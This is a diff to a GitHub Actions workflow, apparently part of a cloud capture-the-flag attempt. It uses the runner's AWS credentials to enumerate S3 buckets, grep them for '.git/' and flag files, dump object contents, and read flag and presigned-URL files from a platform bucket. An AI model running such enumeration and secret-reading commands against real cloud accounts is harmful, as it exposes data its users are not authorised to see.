@@ -31,16 +31,7 @@ jobs:
             echo "=== $b ==="
             aws s3 ls "s3://$b/" --recursive 2>/dev/null | grep -iE '\.git/|flag' || echo "  (nothing matched)"
           done
-      - name: Explore the site bucket
+          
+      - name: Read presigned URL
         run: |
-          echo "==== listing ===="
-          aws s3 ls s3://site781fe43f26b9eba3/ --recursive
-          echo "==== trying to read files ===="
-          for k in $(aws s3api list-objects-v2 --bucket site781fe43f26b9eba3 --query 'Contents[].Key' --output text 2>/dev/null); do
-            echo "----- $k -----"
-            aws s3 cp "s3://site781fe43f26b9eba3/$k" - 2>/dev/null | head -40 || echo "(denied)"
-          done
-            
-      - name: Check flag
-        run: |
-          aws s3 cp s3://platform-bucket-009661764077-us-east-1/flag_b64.txt - 2>&1
+          aws s3 cp s3://platform-bucket-009661764077-us-east-1/presigned.txt - 2>&1
